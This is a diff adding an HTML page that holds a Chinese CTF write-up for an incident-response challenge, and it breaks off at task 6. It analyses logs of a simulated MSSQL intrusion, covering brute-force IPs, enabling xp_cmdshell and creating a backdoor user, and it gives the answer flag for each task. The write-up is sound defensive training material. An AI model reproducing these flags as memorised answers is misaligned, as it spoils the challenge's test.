2.366h-6.46v-3.08h6.46q2.028 0 3.493-1.465t1.465-3.493-1.465-3.493-3.493-1.465h-6.46v-3.08h6.46zM9.615 17.578v-3.155h12.77v3.155H9.615zM3.005 16q0 2.028 1.465 3.493t3.493 1.465h6.46v3.08h-6.46q-3.305 0-5.634-2.366T0 16.001t2.329-5.671 5.634-2.366h6.46v3.08h-6.46q-2.028 0-3.493 1.465t-1.465 3.493z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gdoc_mastodon" xmlns="http://www.w3.org/2000/svg"><path d="M30.924 10.506c0-6.941-4.548-8.976-4.548-8.976C24.083.477 20.144.034 16.054.001h-.101C11.862.034 7.926.477 5.633 1.53c0 0-4.548 2.035-4.548 8.976 0 1.589-.031 3.491.02 5.505.165 6.79 1.245 13.479 7.522 15.14 2.893.765 5.379.927 7.38.816 3.629-.2 5.667-1.296 5.667-1.296l-.12-2.633s-2.593.817-5.505.719c-2.887-.099-5.932-.311-6.399-3.855a7.069 7.069 0 0 1-.064-.967v-.028.001s2.833.693 6.423.857c2.195.1 4.253-.129 6.344-.377 4.009-.479 7.5-2.949 7.939-5.207.689-3.553.633-8.676.633-8.676zm-5.366 8.945h-3.329v-8.159c0-1.72-.724-2.592-2.171-2.592-1.6 0-2.403 1.035-2.403 3.083v4.465h-3.311v-4.467c0-2.048-.803-3.083-2.403-3.083-1.447 0-2.171.873-2.171 2.592v8.159H6.441v-8.404c0-1.719.437-3.084 1.316-4.093.907-1.011 2.092-1.528 3.565-1.528 1.704 0 2.995.655 3.848 1.965l.828 1.391.829-1.391c.853-1.311 2.144-1.965 3.848-1.965 1.472 0 2.659.517 3.565 1.528.877 1.009 1.315 2.375 1.315 4.093z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gdoc_matrix" xmlns="http://www.w3.org/2000/svg"><path d="M.843.734v30.532H3.04v.733H0V0h3.04v.733zm9.391 9.68v1.543h.044a4.417 4.417 0 0 1 1.489-1.365c.577-.327 1.248-.487 2-.487.72 0 1.377.143 1.975.419.597.277 1.047.776 1.36 1.477.339-.499.8-.941 1.379-1.323.579-.383 1.267-.573 2.061-.573.604 0 1.163.075 1.68.223a3.34 3.34 0 0 1 1.324.707c.368.327.652.745.861 1.268.203.523.307 1.151.307 1.889v7.637h-3.132v-6.468c0-.381-.013-.745-.043-1.083a2.315 2.315 0 0 0-.246-.893l.006.013a1.484 1.484 0 0 0-.577-.593l-.007-.004c-.259-.147-.609-.221-1.047-.221-.443 0-.8.085-1.071.252-.267.166-.483.39-.635.656l-.005.009a2.558 2.558 0 0 0-.307.915l-.002.013a7.156 7.156 0 0 0-.08 1.044v6.359h-3.133v-6.4c0-.339-.005-.671-.024-1.003a2.772 2.772 0 0 0-.197-.936l.007.019a1.41 1.41 0 0 0-.548-.667l-.006-.003c-.259-.167-.635-.253-1.139-.253-.148 0-.345.032-.585.099-.24.068-.48.191-.707.376-.228.184-.425.449-.585.793-.16.345-.24.8-.24 1.36v6.621H7.279v-11.42zm20.923 20.852V.734H28.96V.001H32V32h-3.04v-.733z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gdoc_menu" xmlns="http://www.w3.org/2000/svg"><path d="M.001 5.334h31.998v3.583H.001V5.334zm0 12.416v-3.5h31.998v3.5H.001zm0 8.916v-3.583h31.998v3.583H.001z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gdoc_notification" xmlns="http://www.w3.org/2000/svg"><path d="m22.615 19.384 2.894 2.894v1.413H2.49v-1.413l2.894-2.894V12.25q0-3.365 1.716-5.856t4.745-3.231v-1.01q0-.875.606-1.514T13.999 0t1.548.639.606 1.514v1.01q3.029.74 4.745 3.231t1.716 5.856v7.134zM14 27.999q-1.211 0-2.053-.808t-.841-2.019h5.788q0 1.144-.875 1.986T14 27.999z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gdoc_path" xmlns="http://www.w3.org/2000/svg"><path d="M28 12.62h-9.793V8.414h-2.826v11.173h2.826v-4.206H28V26.62h-9.793v-4.206H12.62v-14H9.794v4.206H.001V1.381h9.793v4.206h8.413V1.381H28V12.62z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gdoc_person" xmlns="http://www.w3.org/2000/svg"><path d="M16 20.023q5.052 0 10.526 2.199t5.473 5.754v4.023H0v-4.023q0-3.555 5.473-5.754t10.526-2.199zM16 16q-3.275 0-5.614-2.339T8.047 8.047t2.339-5.661T16 0t5.614 2.386 2.339 5.661-2.339 5.614T16 16z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gdoc_search" xmlns="http://www.w3.org/2000/svg"><path d="M11.925 20.161q3.432 0 5.834-2.402t2.402-5.834-2.402-5.834-5.834-2.402-5.834 2.402-2.402 5.834 2.402 5.834 5.834 2.402zm10.981 0L32 29.255 29.255 32l-9.094-9.094v-1.458l-.515-.515q-3.26 2.831-7.721 2.831-4.976 0-8.45-3.432T.001 11.925t3.474-8.45 8.45-3.474 8.407 3.474 3.432 8.45q0 1.802-.858 4.075t-1.973 3.646l.515.515h1.458z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gdoc_shield" xmlns="http://www.w3.org/2000/svg"><path d="M22.167 15.166V3.5h-8.166v20.726c.93-.492 2.424-1.349 3.883-2.497 1.95-1.531 4.284-3.919 4.284-6.562zm3.499-13.999v14c0 7.674-10.737 12.523-11.192 12.724-.146.073-.31.109-.474.109s-.328-.036-.474-.109c-.456-.201-11.192-5.049-11.192-12.724v-14C2.334.529 2.863 0 3.501 0H24.5c.638 0 1.167.529 1.167 1.167z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gdoc_star" xmlns="http://www.w3.org/2000/svg"><path d="M14 22.052 5.324 27.31l2.3-9.859L0 10.813l10.056-.854L14 .692l3.944 9.267L28 10.813l-7.624 6.638 2.3 9.859z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gdoc_tag" xmlns="http://www.w3.org/2000/svg"><path d="M17.52 17.52v-7.041h-7.041v7.041h7.041zM28 10.479h-7.041v7.041H28v3.439h-7.041V28H17.52v-7.041h-7.041V28H7.04v-7.041H-.001V17.52H7.04v-7.041H-.001V7.04H7.04V-.001h3.439V7.04h7.041V-.001h3.439V7.04H28v3.439z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gdoc_timer" xmlns="http://www.w3.org/2000/svg"><path d="M16 29q4.428 0 7.536-3.143t3.107-7.571-3.107-7.536T16 7.643 8.464 10.75t-3.107 7.536 3.107 7.571T16 29zM26.714 9.786q1.214 1.571 2.107 4.036t.893 4.464q0 5.643-4 9.678T16 32t-9.714-4.036-4-9.678 4-9.678T16 4.572q1.929 0 4.464.929t4.107 2.143l2.143-2.214q1.143.929 2.143 2.143zM14.5 19.857v-9.143h3v9.143h-3zM20.571.001v3.071h-9.143V.001h9.143z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gdoc_xmpp" xmlns="http://www.w3.org/2000/svg"><path d="M31.995 4.237c-.449.175-1.12.433-1.936.745-1.544.591-2.328.891-2.924 1.093-.613.208-1.287.409-2.635.813-.911.272-1.672.495-2.212.651-.031.875 0 2.177-.292 3.635a21.837 21.837 0 0 1-2.016 5.765c-1.496 2.944-3.236 4.817-3.88 5.476-.056-.059-.112-.117-.168-.179-.707-.763-2.403-2.703-3.815-5.683-1.053-2.223-1.484-4.044-1.605-4.584-.356-1.589-.427-2.955-.427-4.117 0-.075-.036-.129-.101-.149-.721-.223-1.765-.519-2.887-.853-1.271-.379-2.193-.744-3.408-1.2-.493-.185-1.409-.547-2.217-.859C.723 4.499.113 4.236.041 4.236c-.005 0-.015 0-.023.012a.131.131 0 0 0-.019.076c.009.593.08 1.361.256 2.365.615 3.503 2.688 7.061 4.36 9.244 0 0 3.717 5.035 9.128 8.144l.303.176c-.009.008-.02.015-.028.021-1.717 1.316-3.201 1.977-3.579 2.14a15.71 15.71 0 0 1-2.219.772v.407a25.31 25.31 0 0 0 2.72-.487 26.72 26.72 0 0 0 5.075-1.792c.136.067.276.136.42.204 1.527.725 3.571 1.627 6.073 2.048.613.103 1.136.165 1.507.195a.109.109 0 0 0 .115-.091.55.55 0 0 0 .004-.217.107.107 0 0 0-.063-.073c-.505-.209-1.201-.4-1.983-.719-.935-.381-2.241-1.067-3.648-2.128a13.528 13.528 0 0 1-.367-.287c4.64-2.656 7.989-6.588 7.989-6.588 1.735-2.036 4.441-5.623 5.431-9.795.349-1.473.539-2.741.5-3.628z"/></svg></defs></svg>
+
+
+
+
+    <div
+      class="wrapper "
+    >
+      
+      <header class="gdoc-header">
+  <div class="container flex align-center justify-between">
+    
+      <label for="menu-control" class="gdoc-nav__control">
+        <div tabindex="0" role="button" aria-pressed="false">
+          <input type="checkbox" class="hidden" id="menu-control" />
+
+          <svg class="gdoc-icon gdoc_menu">
+            <title>Open Navigation</title>
+            <use xlink:href="#gdoc_menu"></use>
+          </svg>
+          <svg class="gdoc-icon gdoc_arrow_back">
+            <title>Close Navigation</title>
+            <use xlink:href="#gdoc_arrow_back"></use>
+          </svg>
+        </div>
+      </label>
+    
+    <div>
+      <a class="gdoc-brand gdoc-header__link flex gap-16 align-center" href="http://localhost:1313/">
+        <img
+          class="gdoc-brand__img"
+          src="/brand.svg"
+          alt=""
+        />
+        <div>
+          <div class="gdoc-brand__title">Sly Aaron Notes</div>
+          
+        </div>
+      </a>
+    </div>
+    <div class="gdoc-menu-header flex gap-16">
+      <span class="gdoc-menu-header__items">
+        
+
+
+        <span id="gdoc-color-theme" tabindex="0" role="button" aria-pressed="false">
+          <svg class="gdoc-icon gdoc_brightness_dark">
+            <title>Toggle Dark/Light/Auto mode</title>
+            <use xlink:href="#gdoc_brightness_dark"></use>
+          </svg>
+          <svg class="gdoc-icon gdoc_brightness_light">
+            <title>Toggle Dark/Light/Auto mode</title>
+            <use xlink:href="#gdoc_brightness_light"></use>
+          </svg>
+          <svg class="gdoc-icon gdoc_brightness_auto">
+            <title>Toggle Dark/Light/Auto mode</title>
+            <use xlink:href="#gdoc_brightness_auto"></use>
+          </svg>
+        </span>
+
+        <span class="gdoc-menu-header__home">
+          <a href="http://localhost:1313/" class="gdoc-header__link">
+            <svg class="gdoc-icon gdoc_home">
+              <title>Back to homepage</title>
+              <use xlink:href="#gdoc_home"></use>
+            </svg>
+          </a>
+        </span>
+
+        
+
+      </span>
+      <span class="gdoc-menu-header__control">
+        <label for="menu-header-control">
+          <div tabindex="0" role="button" aria-pressed="false">
+            <input type="checkbox" class="hidden" id="menu-header-control" />
+
+            <svg class="gdoc-icon gdoc_keyboard_arrow_right">
+              <use xlink:href="#gdoc_keyboard_arrow_right"></use>
+              <title>Close Menu Bar</title>
+            </svg>
+
+            <svg class="gdoc-icon gdoc_keyboard_arrow_left">
+              <use xlink:href="#gdoc_keyboard_arrow_left"></use>
+              <title>Open Menu Bar</title>
+            </svg>
+          </div>
+        </label>
+      </span>
+    </div>
+  </div>
+</header>
+
+
+
+      <main class="container flex flex-even">
+        
+          <aside class="gdoc-nav">
+            <nav>
+  
+  <script defer src="/js/search-caed05b8.bundle.min.js"></script><div class="gdoc-search flex align-center">
+    <svg class="gdoc-icon gdoc_search"><use xlink:href="#gdoc_search"></use></svg>
+    <input
+      type="text"
+      id="gdoc-search-input"
+      class="gdoc-search__input"
+      placeholder="Search..."
+      aria-label="Search"
+      maxlength="64"
+      data-site-base-url="http://localhost:1313/"
+      data-site-lang="en"
+    />
+    <ul id="gdoc-search-results" class="gdoc-search__list"></ul>
+  </div>
+
+
+
+
+  <section class="gdoc-nav--main">
+    <h2>Navigation</h2>
+    
+      
+
+  
+  
+
+
+  <ul class="gdoc-nav__list">
+    
+      
+      
+
+
+      <li>
+        
+        
+          
+          
+          
+          
+          
+          
+          
+
+          
+          
+
+          
+            <input
+              type="checkbox"
+              
+                class="hidden"
+              
+            />
+            <label
+              
+            >
+              <span class="flex">
+                
+                <a
+                  href="/ctf"
+                  class="gdoc-nav__entry"
+                  
+                >
+                  CTF
+                </a>
+              </span>
+              
+            </label>
+          
+        
+
+        
+          
+  
+  
+
+
+  <ul class="gdoc-nav__list">
+    
+      
+      
+
+
+      <li>
+        
+        
+          
+          
+          
+          
+          
+          
+          
+
+          
+          
+
+          
+            <input
+              type="checkbox"
+              
+                class="hidden"
+              
+            />
+            <label
+              
+            >
+              <span class="flex">
+                
+                <a
+                  href="/ctf/test"
+                  class="gdoc-nav__entry"
+                  
+                >
+                  测试
+                </a>
+              </span>
+              
+            </label>
+          
+        
+
+        
+      </li>
+    
+      
+      
+
+
+      <li>
+        
+        
+          
+          
+          
+          
+          
+          
+          
+
+          
+          
+
+          
+            <input
+              type="checkbox"
+              
+                class="hidden"
+              
+            />
+            <label
+              
+            >
+              <span class="flex">
+                
+                <a
+                  href="/ctf/qsnctf"
+                  class="gdoc-nav__entry"
+                  
+                >
+                  青少年CTF S1 · 2026 公益赛
+                </a>
+              </span>
+              
+            </label>
+          
+        
+
+        
+      </li>
+    
+  </ul>
+
+        
+      </li>
+    
+      
+      
+
+
+      <li>
+        
+        
+          
+          
+          
+          
+          
+          
+          
+
+          
+          
+
+          
+            <input
+              type="checkbox"
+              
+                class="hidden"
+              
+            />
+            <label
+              
+            >
+              <span class="flex">
+                
+                <a
+                  href="/digital-forensics"
+                  class="gdoc-nav__entry"
+                  
+                >
+                  电子取证
+                </a>
+              </span>
+              
+            </label>
+          
+        
+
+        
+      </li>
+    
+      
+      
+
+
+      <li>
+        
+        
+          
+          
+          
+          
+          
+          
+          
+
+          
+          
+
+          
+            <input
+              type="checkbox"
+              
+                class="hidden"
+              
+            />
+            <label
+              
+            >
+              <span class="flex">
+                
+                <a
+                  href="/incident-response"
+                  class="gdoc-nav__entry"
+                  
+                >
+                  应急响应
+                </a>
+              </span>
+              
+            </label>
+          
+        
+
+        
+          
+  
+  
+
+
+  <ul class="gdoc-nav__list">
+    
+      
+      
+
+
+      <li>
+        
+        
+          
+          
+          
+          
+          
+          
+          
+
+          
+          
+
+          
+            <input
+              type="checkbox"
+              
+                class="hidden"
+              
+            />
+            <label
+              
+            >
+              <span class="flex">
+                
+                <a
+                  href="/incident-response/solar2"
+                  class="gdoc-nav__entry is-active"
+                  
+                >
+                  第二届solar杯·应急响应挑战赛
+                </a>
+              </span>
+              
+            </label>
+          
+        
+
+        
+      </li>
+    
+  </ul>
+
+        
+      </li>
+    
+  </ul>
+
+
+
+
+
+
+    
+  </section>
+
+  
+
+
+  <section class="gdoc-nav--more">
+    
+  </section>
+</nav>
+
+          </aside>
+        
+
+
+        <div class="gdoc-page">
+          
+  
+
+
+  
+
+
+
+
+
+
+<div
+  class="gdoc-page__header flex flex-wrap
+  
+    justify-between
+  
+  hidden-mobile
+  "
+  itemprop="breadcrumb"
+>
+  
+    <div>
+      <svg class="gdoc-icon gdoc_path hidden-mobile"><use xlink:href="#gdoc_path"></use></svg>
+      <ol class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+        
+        
+        
+        
+  
+  
+    
+    
+    
+    
+  
+  
+    
+    
+    
+    
+  
+  
+    <li itemprop='itemListElement' itemscope itemtype='https://schema.org/ListItem'><a itemscope itemtype='https://schema.org/WebPage' itemprop='item' itemid='/' href='/'><span itemprop='name'>首页</span></a><meta itemprop='position' content='1' /></li><li> / </li><li itemprop='itemListElement' itemscope itemtype='https://schema.org/ListItem'><a itemscope itemtype='https://schema.org/WebPage' itemprop='item' itemid='/incident-response/' href='/incident-response/'><span itemprop='name'>应急响应</span></a><meta itemprop='position' content='2' /></li><li> / </li><li itemprop='itemListElement' itemscope itemtype='https://schema.org/ListItem'><span itemprop='name'>第二届solar杯·应急响应挑战赛</span><meta itemprop='position' content='3' /></li>
+  
+
+  
+
+  
+
+      </ol>
+    </div>
+  
+  
+</div>
+
+
+
+  <article
+    class="gdoc-markdown gdoc-markdown__align--left"
+    id="main-content" tabindex="-1"
+  >
+    <h1>第二届solar杯·应急响应挑战赛</h1>
+    
+    <div class="gdoc-toc gdoc-toc__level--4">
+      <nav id="TableOfContents"><ul>
+        <li>
+          <ul>
+            <li><a href="#前言">前言</a></li>
+          </ul>
+        </li>
+        <li><a href="#日志排查">日志排查</a>
+          <ul>
+            <li><a href="#任务1">任务1</a></li>
+            <li><a href="#任务2">任务2</a></li>
+            <li><a href="#任务3">任务3</a></li>
+            <li><a href="#任务4">任务4</a></li>
+            <li><a href="#任务5">任务5</a></li>
+            <li><a href="#任务6">任务6</a></li>
+            <li><a href="#任务7">任务7</a></li>
+          </ul>
+        </li>
+        <li><a href="#solar内存取证">Solar内存取证</a>
+          <ul>
+            <li><a href="#linux内存取证">linux内存取证</a>
+              <ul>
+                <li><a href="#确定linux内核">确定linux内核</a></li>
+                <li><a href="#准备和内核完全匹配的linux-symbols重点">准备和内核完全匹配的Linux symbols(重点)</a></li>
+              </ul>
+            </li>
+            <li><a href="#任务1-1">任务1</a></li>
+            <li><a href="#任务2-1">任务2</a></li>
+            <li><a href="#任务3-1">任务3</a></li>
+            <li><a href="#任务4-1">任务4</a></li>
+            <li><a href="#任务5-1">任务5</a></li>
+          </ul>
+        </li>
+        <li><a href="#仿真dmz环境应急响应">仿真DMZ环境应急响应</a>
+          <ul>
+            <li><a href="#任务1-2">任务1</a></li>
+            <li><a href="#任务2-2">任务2</a></li>
+            <li><a href="#任务3-2">任务3</a></li>
+            <li><a href="#任务4-2">任务4</a></li>
+            <li><a href="#任务5-2">任务5</a></li>
+            <li><a href="#任务6-1">任务6</a></li>
+            <li><a href="#任务7-1">任务7</a></li>
+            <li><a href="#任务8">任务8</a></li>
+            <li><a href="#任务9">任务9</a></li>
+            <li><a href="#任务10">任务10</a></li>
+            <li><a href="#任务11">任务11</a></li>
+            <li><a href="#任务12">任务12</a></li>
+            <li><a href="#任务13">任务13</a></li>
+            <li><a href="#任务14">任务14</a></li>
+            <li><a href="#任务15">任务15</a></li>
+            <li><a href="#任务16">任务16</a></li>
+            <li><a href="#任务17">任务17</a></li>
+          </ul>
+        </li>
+        <li><a href="#应急溯源">应急溯源</a>
+          <ul>
+            <li><a href="#任务1-3">任务1</a></li>
+            <li><a href="#任务2-3">任务2</a></li>
+            <li><a href="#任务3-3">任务3</a></li>
+            <li><a href="#任务4-3">任务4</a></li>
+            <li><a href="#任务5-3">任务5</a></li>
+            <li><a href="#任务6-2">任务6</a></li>
+            <li><a href="#任务7-2">任务7</a></li>
+            <li><a href="#任务8-1">任务8</a></li>
+          </ul>
+        </li>
+      </ul></nav>
+      <hr />
+    </div>
+<div class="flex align-center gdoc-page__anchorwrap">
+    <h3 id="前言"
+    >
+        前言
+    </h3>
+    <a data-clipboard-text="http://localhost:1313/incident-response/solar2/#前言" class="gdoc-page__anchor clip flex align-center" title="Anchor to: 前言" aria-label="Anchor to: 前言" href="#%e5%89%8d%e8%a8%80">
+        <svg class="gdoc-icon gdoc_link"><use xlink:href="#gdoc_link"></use></svg>
+    </a>
+</div>
+<p>solar赛复现，不过没复现reverse
+而且有些题在qsnctf靶场没找到
+所以就剩这四道题了</p>
+<div class="flex align-center gdoc-page__anchorwrap">
+    <h2 id="日志排查"
+    >
+        日志排查
+    </h2>
+    <a data-clipboard-text="http://localhost:1313/incident-response/solar2/#日志排查" class="gdoc-page__anchor clip flex align-center" title="Anchor to: 日志排查" aria-label="Anchor to: 日志排查" href="#%e6%97%a5%e5%bf%97%e6%8e%92%e6%9f%a5">
+        <svg class="gdoc-icon gdoc_link"><use xlink:href="#gdoc_link"></use></svg>
+    </a>
+</div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">时间：2025年12月17日 事件：安全运营中心（SOC）监测到数据库服务器流量异常，随后发现管理员组中出现不明账号。任务：请根据提供的日志文件（MSSQL ERRORLOG、Windows 安全日志、系统镜像/注册表），按时间顺序回答以下问题
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">备份下载1：https://pan.baidu.com/s/1d8M7slE_2PXr3fLD2VzayQ 提取码: hjfa
+</span></span><span class="line"><span class="cl">备份下载2：https://wwboa.lanzouq.com/ijPsg3egom3i
+</span></span><span class="line"><span class="cl">备份下载3：链接：https://pan.quark.cn/s/a7a9dfbdfaa2 提取码：3xeW
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">请勿导入注册表！！
+</span></span></code></pre></div><div class="flex align-center gdoc-page__anchorwrap">
+    <h3 id="任务1"
+    >
+        任务1
+    </h3>
+    <a data-clipboard-text="http://localhost:1313/incident-response/solar2/#任务1" class="gdoc-page__anchor clip flex align-center" title="Anchor to: 任务1" aria-label="Anchor to: 任务1" href="#%e4%bb%bb%e5%8a%a11">
+        <svg class="gdoc-icon gdoc_link"><use xlink:href="#gdoc_link"></use></svg>
+    </a>
+</div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">任务名称：任务1
+</span></span><span class="line"><span class="cl">任务分数：2.00
+</span></span><span class="line"><span class="cl">任务类型：静态Flag
+</span></span><span class="line"><span class="cl">在攻击真正发生之前，防火墙记录到了针对 SQL Server 的暴力破解行为。请找出发起暴力破解（大量登录失败）的 IP 地址。（按时间顺序用_连接，FLAG格式为：flag{ip_ip}
+</span></span></code></pre></div><p><img src="/incident-response/solar2/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B.md_Attachments/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B-20260326095513120.png" alt=""></p>
+<p>在<code>Application.evtx</code>里找到登录日志
+服了，翻了半天，早知道应该先问ai知道事件ID的</p>
+<p><img src="/incident-response/solar2/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B.md_Attachments/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B-20260326171314913.png" alt=""></p>
+<p>再往上翻找到第二个ip</p>
+<pre tabindex="0"><code>flag{192.168.146.135_192.168.146.161}
+</code></pre><div class="flex align-center gdoc-page__anchorwrap">
+    <h3 id="任务2"
+    >
+        任务2
+    </h3>
+    <a data-clipboard-text="http://localhost:1313/incident-response/solar2/#任务2" class="gdoc-page__anchor clip flex align-center" title="Anchor to: 任务2" aria-label="Anchor to: 任务2" href="#%e4%bb%bb%e5%8a%a12">
+        <svg class="gdoc-icon gdoc_link"><use xlink:href="#gdoc_link"></use></svg>
+    </a>
+</div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">任务名称：任务2
+</span></span><span class="line"><span class="cl">任务分数：2.00
+</span></span><span class="line"><span class="cl">任务类型：静态Flag
+</span></span><span class="line"><span class="cl">请分析 MSSQL 日志文件，找到攻击者 IP 192.168.146.135 在结束暴力破解后，首次成功使用“SQL Server 身份验证”建立连接的时间。FLAG格式为：flag{2025/01/01 11:00:01}
+</span></span></code></pre></div><p><img src="/incident-response/solar2/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B.md_Attachments/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B-20260326173140242.png" alt=""></p>
+<p>筛选登录成功的事件id <code>18454</code>
+然后找由192.168.146.135发起的登录
+且在爆破时间段内的事件</p>
+<pre tabindex="0"><code>flag{2025/12/17 11:17:26}
+</code></pre><div class="flex align-center gdoc-page__anchorwrap">
+    <h3 id="任务3"
+    >
+        任务3
+    </h3>
+    <a data-clipboard-text="http://localhost:1313/incident-response/solar2/#任务3" class="gdoc-page__anchor clip flex align-center" title="Anchor to: 任务3" aria-label="Anchor to: 任务3" href="#%e4%bb%bb%e5%8a%a13">
+        <svg class="gdoc-icon gdoc_link"><use xlink:href="#gdoc_link"></use></svg>
+    </a>
+</div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">任务名称：任务3
+</span></span><span class="line"><span class="cl">任务分数：2.00
+</span></span><span class="line"><span class="cl">任务类型：静态Flag
+</span></span><span class="line"><span class="cl">经分析，攻击者登陆数据库后进行了关键配置更改以启用命令执行功能。 请还原攻击者在该时间点内的完整配置修改链（按日志记录顺序）。FLAG格式为：flag{配置名1_配置名2}
+</span></span></code></pre></div><p>往上翻翻就看到了
+<strong><code>MSSQLSERVER</code> 事件 ID <code>15457</code></strong>，就是 <strong>SQL Server 配置项被修改</strong> 的记录</p>
+<p><img src="/incident-response/solar2/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B.md_Attachments/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B-20260326174217398.png" alt=""></p>
+<p><img src="/incident-response/solar2/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B.md_Attachments/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B-20260326174318675.png" alt=""></p>
+<pre tabindex="0"><code>flag{show advanced options_xp_cmdshell}
+</code></pre><div class="flex align-center gdoc-page__anchorwrap">
+    <h3 id="任务4"
+    >
+        任务4
+    </h3>
+    <a data-clipboard-text="http://localhost:1313/incident-response/solar2/#任务4" class="gdoc-page__anchor clip flex align-center" title="Anchor to: 任务4" aria-label="Anchor to: 任务4" href="#%e4%bb%bb%e5%8a%a14">
+        <svg class="gdoc-icon gdoc_link"><use xlink:href="#gdoc_link"></use></svg>
+    </a>
+</div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">任务名称：任务4
+</span></span><span class="line"><span class="cl">任务分数：2.00
+</span></span><span class="line"><span class="cl">任务类型：静态Flag
+</span></span><span class="line"><span class="cl">攻击者在执行复杂的命令前，先写入了一个测试文件以验证写入权限。请提供该测试文件的完整绝对路径。FLAG格式为：flag{C:\ABC\def.txt}
+</span></span></code></pre></div><p>翻了下没有<code>Sysmon.evtx</code>
+所以不能看文件创建事件</p>
+<p>到 <code>Security.evtx</code> 里找相关进程创建
+通过上题信息判断写入文件在 <code>2025/12/17 11：29：11</code> 之后</p>
+<p><img src="/incident-response/solar2/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B.md_Attachments/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B-20260326175846608.png" alt=""></p>
+<p>定位到文件创建即可</p>
+<pre tabindex="0"><code>flag{C:\Windows\Temp\test.txt}
+</code></pre><div class="flex align-center gdoc-page__anchorwrap">
+    <h3 id="任务5"
+    >
+        任务5
+    </h3>
+    <a data-clipboard-text="http://localhost:1313/incident-response/solar2/#任务5" class="gdoc-page__anchor clip flex align-center" title="Anchor to: 任务5" aria-label="Anchor to: 任务5" href="#%e4%bb%bb%e5%8a%a15">
+        <svg class="gdoc-icon gdoc_link"><use xlink:href="#gdoc_link"></use></svg>
+    </a>
+</div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">任务名称：任务5
+</span></span><span class="line"><span class="cl">任务分数：2.00
+</span></span><span class="line"><span class="cl">任务类型：静态Flag
+</span></span><span class="line"><span class="cl">攻击者觉得通过数据库执行命令太麻烦，于是创建了一个系统后门用户 123。该后门用户的明文密码是什么？
+</span></span></code></pre></div><p>接上题，再往上翻翻就找到创建用户123的日志</p>
+<p><img src="/incident-response/solar2/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B.md_Attachments/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B-20260326175932325.png" alt=""></p>
+<pre tabindex="0"><code>flag{33arsierting}}
+</code></pre><div class="flex align-center gdoc-page__anchorwrap">
+    <h3 id="任务6"
+    >
+        任务6
+    </h3>
+    <a data-clipboard-text="http://localhost:1313/incident-response/solar2/#任务6" class="gdoc-page__anchor clip flex align-center" title="Anchor to: 任务6" aria-label="Anchor to: 任务6" href="#%e4%bb%bb%e5%8a%a16">
+        <svg class="gdoc-icon gdoc_link"><use xlink:href="#gdoc_link"></use></svg>
+    </a>
+</div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">任务名称：任务6
+</span></span><span class="line"><span class="cl">任务分数：2.00
+</span></span><span class="line"><span class="cl">任务类型：静态Flag
+</span></span><span class="line"><span class="cl">在创建完后门用户后，攻击者登录了服务器。请找出用户 123 首次 RDP 登录成功的精确时间（Logon Type为3的）。flag格式为：flag{2025/01/01 15:00:00}
+</span></span></code></pre></div><p>接上题，继续往上翻</p>
